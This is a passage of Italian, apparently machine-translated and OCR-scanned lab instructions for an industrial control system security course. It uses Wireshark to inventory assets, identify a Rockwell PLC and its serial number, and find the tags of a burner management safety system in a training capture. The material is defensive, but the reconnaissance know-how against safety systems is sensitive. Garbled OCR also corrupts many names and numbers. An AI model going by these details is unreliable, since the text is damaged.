 nel pannello Wireshark, fare clic su Statistiche

> Fare clic su Gerarchia protocolli
 Protocollo
 Analizza, Statistica Strumenti di telefonia
(2) Riepilogo dei commenti
 Mostra risoluzione indirizzo eee Gerarchia protocollo
{© Conversazioni
: Endpoint 4 lunghezze di pacchetto...
*ta (0 grafico
 Interni

« Pacchetti percentuali 100,0

~ Telaio vEthernet

© 2021, Robert M. Lee
 Protocollo Internet versione 6
~ Protocollo datagramma utente Multicast Domain Name System Link-local Risoluzione nomi multicast DHCPv6é Data Internet Control Message Protocol v6 Protocollo Internet Versione 4
» Servizio nomi NetBIOS del protocollo datagramma utente
» Servizio datagramma NetBIOS
~ SMB (protocollo di blocco dei messaggi del server)
~ Protocollo MailSlot SMB Protocollo browser Microsoft Windows Multicast Domain Name System Link-local Multicast Name Risoluzione EtherNet/IP (protocollo industriale) Configurazione host dinamica Protocollo Dati
~ Protocollo di controllo della trasmissione
~ EtherNet/IP (protocollo industriale)
» Protocollo industriale comune
» Pacchetto non valido del gestore connessione CIP Classe CIP Protocollo di gestione dei gruppi Internet generico Protocollo dei messaggi di controllo Internet Protocollo di risoluzione degli indirizzi
 100,0
 0,1 0,1 0,0 0,0 0,1 0,0 0,0 99,9 0,1 0,0 0,0
 Pacchetti F 228971 228971
 232
 166489
 11564510
 3
 31
 Laboratorio 2.2-6
 oH ®e OH H ®H HH HH *S * O@
 nmennneenmh ® mm ® eo ® ® WW
<g! Uw Tu
 io)
 ov wow Ww W®

*Nota* Vediamo una varietà di protocolli di rilevamento, ma non possiamo ancora essere sicuri che siano tutti utili. Dovremo convalidarli ciascuno. Ciò che vediamo finora è ARP, MDNS, LLMNR, DHCPv6, NetBIOS, DHCP e IGMP.

> Convalidare il traffico proveniente da ciascun protocollo di rilevamento per identificare quali contengono informazioni principali
> Nella vista Gerarchia protocolli fare clic con il pulsante destro del mouse > Applica come filtro > Seleziona ciascuno
 Protocollo
~ Cornice
~Ethernet
~ Protocollo Internet Versione Protocollo da 6 grammi

>
 Muliicast Das oS Quindi applica come filtro

~ Datagramma utente NetBIOS Nai
~ NetBIOS Da
 Ispezionare ciascuno dei protocolli di rilevamento per determinare quali hanno contenuti significativi
 Preparare un filtro
 Copia come CSV Copia come YAML

~ Pacchetti percentuali
 Selezionato
 Non selezionato
..e Selezionato
 100,0 100,0

...o Selezionato
...e non selezionato
...o non selezionato

*Nota* Non è necessario controllare l'ARP, è intrinsecamente utile collegare il MAC agli IP

{W]mdns| uns Gz: = N. Ora __ Origine Destinazione Protocollo Lunghezza Informazioni 92126 861.991080 169.254.223.26 224.0.6.251 MDNS 81 Query standard @x90@0 ANY DESKTOP-HGA4MU6. Locale,
+> 92127 861.991080 fe80::d92:7d9b:1b72.. FfO2::fb MDNS 101 Query standard ©x9000 ANY DESKTOP-HGA4MU6. locale, 92130 801.997596 169.254.223.26 224.08.8.251 MDNS. 119 Risposta alla query standard 0x9800 AAAA fe8O::d92:7¢

*Nota* MDNS mostra il nome DESKTOP-HGAMU6 che è utile per 169.254.223.26

(]itimar
 N. Ora Sorgente Destinazione Protocollo Lunghezza info 57615 522.552773 fe80::30a8:4300:f13.. FfO2::1:3 LLMNR 94 Interrogazione standard ©x89de A IMPRESE 57616 522.552773 18.10.0.10 224.0.0.252 LLMNR 71 Interrogazione standard Ox8 9de A IMPRESE 57620 522.554370 fe80: :30a8:4300:f13.. FF02::1:3 LLMNR 91 Interrogazione standard Oxb32b AAAA ENTERPRISES 57623 522.560369 fe80: :30a8:4300:f13.. FfO2::1:3 LLMNR 91 Interrogazione standard Oxce35 A ENTERP AUMENTA
$7624 522.560369 109.10.96.10 224.0.0,.252 LLMNR 71 Query standard ©xce35 A ENTERPRISES 57625 522.560369 fe80: :30a8:4300:f13.. FfO2::1:3 LLMNR 91 Query standard @x0594 AAAA IMPRESE

*Nota* LLMNR mostra numerosi nomi host IP come 10.10.0.10 che sono ENTERPRISES

© 2021, Robert M. Lee
 Lab2.2-7 Protocollo |
 No. Ora “fonte ; Destinazione
| 1:356a:8135:c6a9:b939
 1236 37.094066 fe80: :bc76:3047:d6ec:4697 DHCPVv6 2002 53.789764 fe80: :3deb:3fec:7d46:58d4 DHCPVv6 2013 54.799543 fese: :3deb: 3fec: 7d46: 58d4 DHCPVv 6
 onde 08a. = N bit: il server deve eseguire gli aggiornamenti DNS” ae = 0 bit: il server non ha sovrascritto la preferenza S bit del client
= § bit: il server non deve eseguire gli aggiornamenti DNS inoltrati Client aan ENTERPRISE2
~ Opzione classe fornitore: Classe fornitore (16) Lunghezza: 14 Valore: 9000013700084d53465420352e30 ID aziendale: Microsoft (311) fornitore-class-data: MSFT 5.0
>> Richiesta di opzione

*Nota* Non ci concentreremo su IPv6 per semplicità, ma questo protocollo è comunque prezioso e mostra che questo indirizzo IPv6 è ENTERPRISE2 ed è un sistema MSFT 5.0, il che significa server Windows 2000 e versioni successive.

(i{nbas N. “Ora ____ Sorgente Destinazione Protocollo “Lunghezza. “Info 19929 222.865909 16.10.10.30 10.10.255.255 NBNS. 92 Richiesta nome NB ‘IMPRESE<20>
- 20732 229.001874 10.10.10.10 10.10.255.255 NBNS. 92 Richiesta nome NB VIEW-DESIGNER<ic> 20789 229.752095 10.10.10.10 10.10.255.255 NBNS. 92 Richiesta nome NB VIEW-DESIGNER<ic> 20920 230.502282 10.10.10.10 10.10.255.255 NBNS 92 Richiesta nome NB VIEW-DESIGNER<ic> ORAM ONT KOATIA 49 49 19 410 40 10 988 98K Nene 09 Nama mary WR \V/TEWRECTANEDSA nS

*Nota* Il Name Server di NetBIOS (NBNS) è di grande valore e mostra 10.10.10.30 come ENTERPRISES come esempio

© 2021, Robert M. Lee Lab 2.2-8 Protocollo 30952 309.350648 *
: 31589 314.187004 10.10.0.50 10.10.255.255 BROWSEF
' 32431 320.738881 10.10.0.40 10.19.255.255 BROWSEF
' 37275 358.821316 10.10.10.30 10.10.255.255 BROWSEF
| 43550 408.442007 10.10.10.40 10.10.255.255 BROWSEF Dimensione: 67. : ; ;
 Nome del mailslot: \MAILSLOT\BROWSE
~ Comando protocollo browser Microsoft Windows: Annuncio host (0x01) Conteggio aggiornamenti: 0 Periodicità aggiornamenti: 12 minuti Nome host: ENTERPRISES Versione Windows: Windows 7 o Windows Server 2008 R2 Versione principale del sistema operativo: 6 Versione secondaria del sistema operativo: 1 Tipo di server: ©0x00011083 , workstation, server, browser Versione principale protocollo: 15 Versione secondaria protocollo browser: 1 Firma: 0xaa55 Commento host: Utente aziendale 3
 NT Workstation, potenziale Brq

*Nota* Il servizio NetBIOS Datagram mostra alcuni nomi host come ENTERPRISE3 e FACTORY-TALK-HI e tramite condivisioni SMB che la versione di Windows è 7 o Windows Server 2008 R2 con varie informazioni sul sistema operativo.
 ee 1ce vedi nee
 Ciao] DHCP
 No Ora Sorgente Destinazione Sa2de aer: 6.0.0.9 33615 330.309693 0.0.0.0 255.255.255.255 34067 333.431945 0.0.0.0 255.255.255.255 34954 340.676044 0.0.0. 0 2550\255)..295 (255. 36933 356.164078 0.0.0.0 255.255.255.255 40992 388.141472 6.6.8.6 255 1.255.295.2990 41386 391.263943 0.0.0.0 255.255: 255.255 42287 398.508612 0.0.0.0 255.255.255.255 AADANE AAD OOF os es =
 Biscotto magico: DHCP
» Opzione: (53) Tipo di messaggio DHCP (Scopri)
» Opzione: (61) Identificativo del cliente
~ Opzione: (12) Lunghezza nome host: 15
 Nome host: DESKTOP-HGA4MU6

» Antinan: (fA) Identificatore della classe del fornitore

*Nota* DHCP mostra che l'indirizzo dispari 0.0.0.0 è il dispositivo Pegatron e comunica se stesso come dispositivo DESKTOP-HGA4MU6.

© 2021, Robert M. Lee Lab 2.2-9 Sligmp
 N. ss Ora_—- ____ Sorgente 2 vedere lone ____ Lunghezza protocollo 92119 801.978987 169.254 .223.26 224.0.0.22 IGMPv3—s«éGE 92121 801.989751 169.254.223.26 224.0.0.22 IGMPv3 66 92123 801.989751 169.254.223.26 224.0.0.22 IGMPv3 66 92125 801.989751 169.254 .223.26 224.0.0.22 IGMPv3 66 A440 GAN MRATINT AaQN AEA 199 NE ANA A A AN TOME? ehm

*Nota* Non c'è nulla di veramente utile qui in IGMP.

*Risposta* Pertanto ARP, MDNS, LLMNR, DHCPv6, NetBIOS e DHCP sono tutti protocolli di rilevamento IT utili.
 4. Quali sono gli indirizzi IP e (se disponibili) quali sono i nomi host delle risorse Enterprise (L4/L5)?
 10.10.0.10 — IMPRESA1 10.10.0.20 — IMPRESA2 10.10.0.30 — IMPRESE 10.10.0.40 — IMPRESA4 10.10.0.50 — IMPRESE

> Sfrutta i protocolli di rilevamento IT per identificare i dispositivi con nomi host aziendali
> Utilizza i protocolli appena esaminati per registrare nomi e indirizzi |Pv4

(®) (@) o@ eo

(W]nbns Es si eh i an ee mabe sath
 N. Ora Origine Destinazione Protocollo Lunghezza Info _ 35353 343.503232 10.10.10.10 10.10.255.255 NBNS 92 Richiesta nome NB VIEW-DESIGNER<ic> 35422 344.253044 10.10.10.10 10.10.255.255 NBNS 92 Richiesta nome NB VIEW-DESIGNER<1ic> 36116 349.911127 10.10 .10.10 10.10.255.255 NBNS 92 Interrogazione nome NB SF.SYMCD.COM<00> 36253 350.661736 10.10.10.10 10.10.255.255 NBNS 92 Interrogazione nome NB SF.SYMCD.COM<00> 36317 351. 4120 08 10.10.160.10 10.10.255.255 NBNS 92 Interrogazione nome NB SF.SYMCD.COM<00> 36429 352.212488 10.10.10.10 10.10.255.255 NBNS 92 Interrogazione nome NB SF.SYMCB.COM<00> 36511 352.962364 10.10.10.10 10.10.255. 255 NBNS 92 Interrogazione nome NB SF.SYMCB. COM<00> 36617 353.712945 10.10.10.10 16.10.255.255 NBNS 92 Richiesta nome NB SF.SYMCB.COM<00>
 92 Denominazione IMPRESE <20>

$7621 $22.555765 48 .10.9.10 16.10.255.255

*Nota* Se vedi qualcosa di duplicato (cioè due IP diversi che trasmettono che sono un nome host specifico,
 sfruttando gli altri protocolli di rilevamento e osservando i modelli di traffico, ad esempio se il dispositivo sta comunicando su I.C.S. protocolli o meno possono aiutare a deduplicare questi problemi

> Sfrutta l'indirizzamento IPv4 in combinazione con i nomi host
> L'indirizzamento IPv4 segue uno schema che diventa ovvio con i nomi host

© 2021, Robert M. Lee Lab 2.2-10
 eo fF ® © &® & Oh ww
 ohm
 o fF @ @

@

@, py Bp
 io
 noi w Ww Dp Ww
 ahi
 noi ww
 wo w Ww
 oe ww ww
 ww ww

)
 C

‘
 Ethernet-27 | IPv4-23 | IPve

'Indirizzo 7 pacchetti Byt 0.0.0.0 36

| 10.10.0.10 8
-10.10.0.20 2 10.10.0.30 2 10.10.0.40 2

) 10.10.0.50 4 10.10.10.10 79 10.10.10.20 59.848 6,

*Risposta* Le risorse Enterprise sono tutte indirizzate 10.10.0.X che includerebbe 10.10.0.10 — ENTERPRISE1 10.10.0.20 — ENTERPRISE2 10.10.0.30 — ENTERPRISE3 10.10.0.40 — ENTERPRISE4 10.10.0.50 — ENTERPRISES

*Nota* IMPRESE viene visualizzato su un paio di IP diversi ed è il NetBIOS Datagram Service che aiuta a identificare l'indirizzo IP .50 come IMPRESE effettive
 5. Quali sono gli indirizzi IP e (se disponibili) quali sono i nomi dei tubi delle risorse OT (L3 e inferiori)?
 10.10.10.10 — VIEW-DESIGNER (Visualizza Designer)
 10.10.10.20 — FACTORY-TALK-VI (Vista Factory Talk)
 10.10.10.30 - ENG_WORKSTATION (Studio 5000 Logix Designer) 10.10.10.40 — FACTORY-TALK-HI (Factory Talk Historian) 10.10.20.10
 10.10.20.20
 10.10.20.40
 10.10.20.50
 20.10.20.10
 20.10.40.10

> Sfrutta i protocolli di rilevamento IT per identificare i dispositivi che hanno nomi host non aziendali
> Seguire lo stesso procedimento della domanda precedente eliminando i noti Enterprise Ips
 Origine Destinazione Protocollo Lunghezza Informazioni 20920 230 .502282 10.10.10.10 10.10.255.255 NBNS 92 Query nome NB VIEW-DESIGNER<1ic> 28160 287.594735 19.18.10-10 10.10. 255. 255 NBNS 92 Richiesta nome NB VIEW-DESIGNER<ic> 28285 288. 345950 10.10.10.10 10.10.255.255 NBNS 92 Richiesta nome NB VIEW-DESIGNER<ic>

© 2021, Robert M. Lee Lab 2.2-11 3 SS ee 49550 408442007". 10.10.10..40 19.19.255.255 BROWSER. 265 Annuncio dell'host FACTORY-TALK-HI, '
= 1319..1126.231278 10.10.10.40 10.10. 255.255 BROWSER 265 Annuncio host FACTORY-TALK-HT,
 Versione Windows: Windows 7 o Windows Server 2008 RZ Versione principale del sistema operativo: 6 Versione secondaria del sistema operativo: 1
» Tipo di server: 0x@0011003, Workstation, Server, NT Workstation, Potenziale Browser Versione principale del protocollo browser: 15 Versione secondaria del protocollo browser: 1 Firma: @xaa55
 Commento del presentatore: Storico di Factory Talk

> Sfrutta le conversazioni per identificare chi sta comunicando su I.C.S. porti
> Visualizza statistiche > Conversazioni
> Passare alla scheda TCP
© I sistemi operatore comunicano con I.C.S. porte sui controller
 Gli strumenti wireless di telefonia aiutano a acquisire le proprietà dei file Ctrl+Alt+Maiusc+c Indirizzi risolti
 Gerarchia dei protocolli
 Lunghezze dei pacchetti degli endpoint di conversazione
 Pac
 3.336 mila 10.10.10.20 54741 10.10.20.50 44818 29.882 3.336 mila
| 10.10.20.10 44818 10.10.10.30 1511 25.051 5.621k
| 10.10.20.10 44818 10.10.10.30 1746 61.683 10M 10.10.20.20 54741 10.10.20.10 44818 29.827 3.330k
/10.10.20.20 54741 10.20.20.10 44818 55 6.084
| 10.10.20.40 54741 10.10.20.10 44818 29.827 3.330k 10.10.20.40 54741 10.20.40.10 44818 55 6.084
!10.10.20.50 44818 10.10.10.30 1746 20.589 3.546k 10.10.20.50 44818 10.10.10.30 1336 1.230 129k
/10.10.20.50 44818 10.10.10.30 2157 222 40k 10.20.20.10 44818 10.10.10.30 1746 42 6.813
/20.10.40.10 44818 10.10.10.30 1746 42 6.813

© 2021, Robert M. Lee Lab 2.2 -12

»@mememneneen#enrn mf”, * mm ™

sono un
 anno Domini
"Www."
 wo ww ww noi Ww | Ww Ww WH WH Ww noi Ww Ww wa DB noi WD Ww ww

*Nota* La porta 44818 è una porta I.C.S. porta per EtherNet/IP e si troverebbe sul controller. Pertanto possiamo dire che 10.10.10.20 è un sistema operatore (ad esempio HMI o EWS) che comunica con 10.10.20.10 come controller (ad esempio PLC).
 Risorse con EtherNet/IP:
 10.10.20.10 10.10.20.50 10.20.20.10 10.20.40.10

*Nota* Individuazione dei sistemi comunicanti con l'I.C.S. le porte possono aiutare a identificare le stazioni operatore, ad esempio 10.10.10.30 sta comunicando con 10.10.20.10 su 44818.

*Nota* I sistemi non Enterprise seguono lo schema IP di 10.10.10.x per L3 (stazioni operatore) e 10.10.20.x e 10.20.x.x per L2 (controller).

*Risposta* Gli asset L3 e L2 sono:
 10.10.10.10 — VIEW-DESIGNER (View Designer) 10.10.10.20 — FACTORY-TALK-VI (Factory Talk View) 10.10.10.30 - ENG_WORKSTATION (Studio 5000 Logix Designer) 10.10.10.40 — FACTORY-TALK-HI (Factory Talk Historian) 10.10.20.10
 10.10.20.20
 10.10.20.40
 10.10.20.50
 20.10.20.10
 20.10.40.10
 6. Cosa I.C.S. il fornitore produce il PLC? Rockwell
> Filtrare su uno qualsiasi degli indirizzi IP del controller
> Filtra per ip.addr==10.10.20.10
 o I PLC sono tutti realizzati dallo stesso fornitore
> Determinare il fornitore dall'indirizzo Ethernet

© 2021, Robert M. Lee Lab 2.2 -13
(W[ipaddr=210.10.20.10_

| Elenco dei pacchetti ~| | Stretto e largo » |_| Maiuscole/minuscole | String Newsies sal IM Ooo OUR ea = Destinazione
| 90162 786.067827 10.10.20.10 10.10.10.30
| 90163 786 .076708 10.10-20-10 10.10.10.30
| 90165 786.079781 10.10.20.10 10.10.10.30 OnATA Quando annunci AM AN AM AM AN AN AN 9M

» Frame 90163: 591 byte sul cavo (4728 bit), 591 byte catturati (4)
~ Ethernet II, Src: Rockwell_5a:72:ce (00:00:bc:5a:72:ce), Dst: Del:
> Destinazione: Dell_3c:53:0b (f8:db:88:3c:53:0b)
 Sorgente: Rockwell 5a:72:ce (00:00:be:5a:72:ce) Tipo: IPv4 (@x0800)

*Rispondi* Rockwell
 Identificare le risorse e comprendere come appare la rete, come è connessa e quali risorse comunicano tra loro è il primo passo per garantire la sicurezza. Gli strumenti e i processi di difesa sono estremamente limitati quando non capisci cosa stai cercando di difendere.Identificare le risorse e visualizzare una rete può sembrare scoraggiante se vista nel contesto dell'intera rete.

© 2021, Robert M. Lee Lab 2.2-14
 ov 8
 aee ee eee ee

=»
 a > > > mh oH HD ® ®

—— iw
 ae Ww Ww Ww Ww Jw |S Ww YS WD WD Ww WD W

_Lab 2.3 - I.C.S. Analisi del protocollo
 Obiettivi s
 e = Identificare informazioni aggiuntive sui titolari del trattamento che sfruttano l'I.C.S. protocollo/i

*Informazioni sullo scenario* Nel contesto dello scenario, abbiamo una cattura di base dalla raffineria di Calistoga. Come team di sicurezza dobbiamo analizzare l'acquisizione per determinare eventuali informazioni identificative sulle risorse che ci aiuteranno a comprenderne il contesto e i ruoli. Stiamo a questo punto esaminando le normali comunicazioni dell’I.C.S. protocolli per estrarre ulteriori informazioni sulle risorse.
 Preparazione agli esercizi
 Questo laboratorio utilizzerà il RELI.C.S. VM. Sul desktop della VM è presente una cartella identificata come /CS515. All'interno c'è la cartella calistogarefinery e poi la cartella pcaps che contiene il pacchetto di acquisizione normalops.pcap che verrà utilizzato durante questo laboratorio.
 1. Cosa I.C.S. Il protocollo è presente nell'acquisizione?
 2. Quale protocollo è in esecuzione in alcune sessioni con CIP?
 3. Qual è la marca, il modello e il numero di serie del PLC al 10.10.20.10?
 4. Di che tipo di funzione/sistema di sicurezza fa parte 10.10.20.50?
 5. Quali sono alcuni dei tag visualizzabili nelle comunicazioni del 10.10.20.50?
 6. Quante parole è la dimensione del percorso della richiesta per TimerDelay con 10.10.20.50 come destinazione?

© 2021, Robert M. Lee Lab 2.3-1 Attività: identificare gli indirizzi Ethernet, gli indirizzi IP e gli indirizzi I.C.S. Protocolli in small_baseline.pcap
 1. Cosa I.C.S. Il protocollo è presente nell'acquisizione? EtherNet/IPCIP

> Inizia il tuo RELI.C.S. VM
> Accedi alla VM
> ACCEDI =reliquie
> PASSWORD = reliquie

> Apri normalops.pcap in Wireshark

> Apri la cartella I.C.S.515 situata sul desktop e poi vai a calistogarefinery > pcaps
> Fare doppio clic su normalops.pcap per aprire il file in Wireshark
 Gt Home Desktop 1CS515 calistogarefinery pcaps + Oe 2 = = o x
 x Stella modificata
> Recenti:

* incidente.pca 196,4 MB 2348 otk
%& Speciale un ms °
() Home normalops.pcap 37,1 MB 23:39 oe
(1 Desktop eee

(=) Documenti
 Te ee Ws

> Identificare i protocolli univoci nel traffico
> Nella parte superiore del pannello Wireshark, fai clic su Statistiche
> Fare clic su Gerarchia protocolli
> Identificare l'I.C.S. protocolli
 Analizza telefonia _Guida strumenti wireless _ Cattura proprietà file Ctrl+Alt+Maiusc+c
 Indirizzi risolti
 Gerarchia dei protocolli
 Conversazioni
 Endpoint
 Lunghezze dei pacchetti
 Grafico 1/O
 Tempo di risposta del servizio |
 10.10. 2(

© 2021, Robert M. Lee Lab 2.3-2
 aw @®) (@) (®)
 Rneneemnemnmenenemnn#it#nn*nh)n *f» *) * * ® aw a
 sì
 sì
 sì

‘Con ‘Be iB’ 4B’ ip’

<B'

} Protocols sss ais suai sitet ___* Percent Packets _— Packets
: ied Frame 100.0 228971
) ~ Ethernet 100.0 228971
~ Protocollo Internet versione 6 0.1 288 L » Protocollo datagramma utente 0.1 274
’ Multicast Domain Name System 0.0 4
) Risoluzione dei nomi multicast link-local 0.0 12
) DHCPVv6 0.1 244 b) Dati 0.0 14 2 Protocollo messaggi di controllo Internet v6 0.0 14 3 » Protocollo Internet versione 4 $9.9 228632 a » Protocollo datagramma utente 0.1 232 1 Servizio nomi NetBIOS 0.0 29
~ Servizio datagramma NetBIOS 0,0 21 g ~ SMB (Server Message Block Protocol) 0,0 21
~ Protocollo MailSlot SMB 0.0 21 Protocollo browser Microsoft Windows 0.0 21 Multicast Domain Name System 0.0 4
) Risoluzione nome multicast locale al collegamento 0,0 8 q EtherNet/IP (protocollo industriale) 0,0 52 Protocollo di configurazione host dinamico 0,0 36 Dati 0,0 82
» Protocollo di controllo della trasmissione 99,7 228387 4 ~ EtherNet/IP (protocollo industriale) 72,7 166521
~ Protocollo industriale comune Ted 166489
~ Gestore connessione CIP 0.9 2079 Pacchetto con formato errato 0.0 16 Classe CIP generica 50.5 115645 Protocollo di gestione gruppo Internet 0.0 10 Protocollo messaggi di controllo Internet 0.0 3 Protocollo di risoluzione indirizzo 0.0 51

*Risposta* L'I.C.S. Il protocollo immediatamente evidente è EtherNet/IP CIP
 2. Quale protocollo è in esecuzione in alcune sessioni con CIP? PCCC

*Nota* Continua dall'ultimo passaggio

*Nota* Ci saranno protocolli che Wireshark non analizza, tuttavia in questo caso stiamo solo cercando di vedere se è in uso un altro protocollo incorporato nel CIP. Esistono diversi modi per identificare il protocollo, ma il punto più semplice da cui iniziare è cercare qualsiasi cosa sembri fuori posto

> Filtra per pacchetto non valido
> In Gerarchia protocolli selezionare il pacchetto malformato
> Applica come filtro > Selezionato
> Analizzare le comunicazioni cercando tutto ciò che risalta

© 2021, Robert M. Lee Lab 2.3-3 Dati —yar- Bz
»Protocollo di controllo della trasmissione 99.7 22838
~ EtherNet/IP (protocollo industriale) a & 166521

~ Protocollo industriale comune 72.7 166489

~ Pacchetto non valido del Gestore connessione CIP
 Applica come filtro selezionato
 Non selezionato
...e selezionati

—o
 Protocollo di destinazione
 1312 .946233 19.10.10,39 CIP PCCC
| 1588... 1336 .887681 16.10.20.10 10.10.10.30 CIP PCCC 102 1626... 1360.821953 19.10.20.10 16.16.10.30 cIP Pccc 102

. 1396.709656 10.10.20.10 10.10.10.30 CIP PCCCc 4g 19 20 10° 1p 19 19 20 pp
 Oggetto CIP PCCC
» Servizio: Servizio sconosciuto (0x52) (Risposta)

~ [Informazioni esperto (errore/formato non valido): pacchetto non valido (si è verificata un'eccezione)]
[Pacchetto non valido (si è verificata un'eccezione)]

[Livello di gravità: errore]

[Gruppo: formato non valido]

*Risposta* PCCC è un protocollo che sfrutta il CIP ed è spesso associato ai PLC Rockwell, il che ha senso
 nel nostro ambiente. 3. Qual è la marca, il modello e il numero di serie del PLC al 10.10.20.10?
 Rockwell Automation/Allen-Bradley
 1756-L55/A e 1756-M12/A LOGIX5555
 0x0019c114
> Filtra per l'indirizzo IP del PLC
> Inserisci il filtro ip.addr==10.10.20.10

(WJip.addr==10.10.20.10 a N. _Tempo SOUECR = 5 5 i Destinazione _ Protocollo _ Lunghezza | Info. x -
| "857.1312.928917 ~ 10.10.20.40 10.10.20.10 cIP 116 'DP7Running' - Servizio (@x4
 1557... 1312.934433 10.19.20.10 10.10.20.40 cIP 107 Successo: 'DP7Running' - Ser
 1557... 1312.934729 _10.10.20.40 10.10.20.10 cIP 114 'pp7Start' - Servizio (@x4c)

. 1312.935881 10.10.20.10 10.18.10.30 TCP 60 44818 ~ 1746 [ACK] Seq=8718

. 1312.940368 10.10.20.10 10.10.20.40 cIP 107 Successo: 'DP7Start' - Servi

. 1312.940618 10.10.20.40 10,.10.20.10 cIP 114 'DP7Time' - Servizio (@x4c)
© 2021, Robert M. Lee Lab 2.3-4
 eo« & &
 eo)
 nnn em mh) mm™ 0 ee ee ee ee ee

@me@ne®
 nmamma
(py 'ey ip (eg ig' 'sg! ts) (a
 ip

«se.»
 J
 ws AS ws ww ws Vedi es

*Nota* Possiamo vedere che l'indirizzo IP 10.10.20.10 comunica con una coppia di indirizzi IP inclusi .40 e .30 tramite CIP. Esistono numerosi modi per trovare le comunicazioni anche semplicemente controllando velocemente il blocco “Info”. Poiché si tratta di un'acquisizione abbastanza pulita, possiamo scorrere verso l'alto e iniziare da lì.

> Scorri fino alla parte superiore di Wireshark e identifica eventuali funzioni di identità o attributi
 4 0.005754 10.10.10.20 10.18.20.10 Sessione Registro ENIP 82 (Req), Sessione 5 0.007637 Sessione Registro ENIP 82 (Rsp), Sessione: ENIP 78 Lista Identità (Req)

é q 310. 129 Elenco Identità (R5p),-1756-ENBT/A 8 8.010802 10.16.10. 26 10.16.20.10 CIP CM 114 Invio non connesso: Identità - Ottieni tutti gli attributi 9 8.617643 16.10.26.10 10.16.16.20 cIP 'Swng, 144 Successo: Identità - Ottieni tutti gli attributi

*Nota* Vediamo che viene utilizzato sia il comando Elenco identità (richiesta e risposta) sia il comando Identità: Ottieni tutti gli attributi. Sono ottimi per esaminare e identificare se le informazioni sono rilevanti. L'identità dell'elenco rileva anche nelle informazioni che il dispositivo è un 1756-ENBT/A. I più preziosi saranno i Ottieni attributi che comunicheranno tutto ciò che sappiamo sul dispositivo.
 9 0.817643 144 Successo: Identità - Ottieni attributi Ail
 10 0.017940 46 Gestisci connessione! grande Inoltra aperto (router di messaggi)
 11 6.920693 ‘ 3 se 98 Servizio non supportato: Connection Manager - Large Forward Op 12 8.828992 -18.10. 19.18.20.10 Gestore connessione CIP cM 142 - Inoltra apertura (router di messaggi)
 13 8.630459 10.19.28.10 19.18.16.20 cIP cM 124 Operazione riuscita: Connection Manager - Inoltra aperto
 14 6.030683 19.10.16. 20 19.10.20.10 Classe cIP 412 (8x64) - Ottieni elenco attributi
 15 9.034686 10,19.28.10 10.19.10.20 cIP 143 Successo: Classe (@x64) - Ottieni elenco attributi
 ID fornitore: Ioni di roccia/Allen-Bradley (0x0901)
+ Attributo: 2 = 2)
 Tipo di dispositivo: P: controller logico programmabile (@x008e)
~ Attributo: 3 (Codice Prodotto) Codice Prodotto: 51
» Attributo: 4 (Revisione) Revisione maggiore: 16 Revisione minore: 21
> Attributo: 5 (Stato)
» Stato: 0x3160
~ Attributo: 6 (Numero di serie) Numero di serie: 4
+ Attributo: 7 (Prome oy
 Nome prodotto: 1756-155/A 1756-M12/A LOGIX5S55

*Risposta* Il dispositivo è un Rockwell Automation / Allen-Bradley (marca), 1756-L55/A e 1756-M12/A LOGIX5555 (modello), con numero di serie 0x0019c114. Probabilmente sono presenti 2 moduli 1/O in questo PLC (L55 e M12). 4. Di che tipo di funzione/sistema di sicurezza fa parte 10.10.20.50? Sistema di Sicurezza Gestione Bruciatore

*Nota* A volte è semplice come analizzare il flusso di comunicazioni per identificare le informazioni sul dispositivo.

> Filtra per l'indirizzo IP del PLC
> Inserisci il filtro ip.addr==10.10.20.50

> Segui i flussi TCP per trovare qualcosa di utile

> Fare clic con il pulsante destro del mouse sul primo pacchetto della sessione
> Segui > Flusso TCP

© 2021, Robert M. Lee Lab 2.3-5
"Destinazione
 Informazioni sulla lunghezza del protocollo. a 66 $4741 — 448
 3695 80.900000
 Seleziona/Deseleziona pacchetto Ctrl4M
 3607 80.001608 -10. Ignora/Non ignora il pacchetto Ctrl+D 54 54741 + 448
| 3608 80.005754 ; P 82 Registro Se
| 3609 80 087637 Imposta/Disimposta riferimento temporale Ctrl+T é Visto ierenise
 3610 80.007818 Time Shift... Ctrl+shift+T jp 78 Elenco Identi
 3611 80.009800 Commento pacchetto... Ctrl+Alt+c Pp 129 Elenco Identi
 3612 80.010002 " err rman ———) OM 114 non connesso
 3613 80.017643 109.10.20.50 WvedName — 444 Successo: ID
 3614 80.017940 19.10.19.20 | applica come Filtro cM 146 Connessione
 3615 80.020693 1 20,50 . cM 98 Servizio no
 3616 80.020992 10. .20 Predisposizione come Filtro > Attacco cm 142
 3617 86.030459 10.10. Filtro conversazione +) CM 124 Successo: Co
 3618 8.030683 10.10.10> Colosize Coiwersation ‘ 112 Classe (0x64
 3619 80.034686 10.10.20.— 143 Successo: Cl
 Frame 3605: 66 byte sul cavo (528

>—
» Ethernet II, Origine: Dell_3c:53:0a (Stream TCP Ctrl+Alt+Maiusc+T |
>:7

>
 Internet Penne Neloey 4 artes Copia 'DP stréam ctrl Sh ’ |

| Preferenze protocollo »

-DP16Ora. .db
. D.

. .DP12Timer..
-P12Time..dO...... an Vedi eee err es Pilevel...F..<....S.D..
 A_1ATimaNelaw Von a e DADunnina he an

*Risposta* L'apparecchio si presenta come parte del Sistema di Sicurezza Gestione Bruciatore
 5. Quali sono alcuni dei tag visualizzabili nelle comunicazioni del 10.10.20.50? TimerDelay, Livello, Avvio, ecc.
*Nota* Continuando dall'ultima domanda

*Nota* Possiamo rivedere il flusso TCP e vedere un numero di tag nel traffico. I tag sono rappresentazioni dei dati di processo. Ad esempio, un HMI o uno storico avrebbero un tag per "Tempo" o "Temperatura" o altri valori importanti per il processo e quindi mostrerebbero i dati effettivi accanto ad esso. A volte i tag possono essere visti direttamente nel traffico di rete (ma non sempre).

*Risposta* TimeDelay, Timer, TimerDelay, Level, Start e Running sono tutti tag.

© 2021, Robert M. Lee Lab 2.3-6

*)
 8 a 8 ss 8 a 2 ee SS ee ww Ti aT ie oT ig a Te
 Le'
 come ty oY era se se
 6. Quante parole è la dimensione del percorso della richiesta per TimerDelay con 10.10.20.50 come destinazione? 8

*Nota* I percorsi delle richieste sono la posizione sul dispositivo in cui vengono archiviate le informazioni e spesso indicano i valori che è possibile modificare sul controller con operazioni di lettura/scrittura.

*Nota* Devi considerare l'indirizzo IP .50 come destinazione

> Continuando dall'ultima domanda rivedi le Info delle comunicazioni finché non vedi i valori di TimerDelay
> Selezionare un pacchetto TimerDelay
> Esaminare i dati CIP
 Lui 22574 243.163374 10:.18.19.29 10:10, 20.50. CIP 129 "opgTimerDelay" - Servizio (Ox4c)
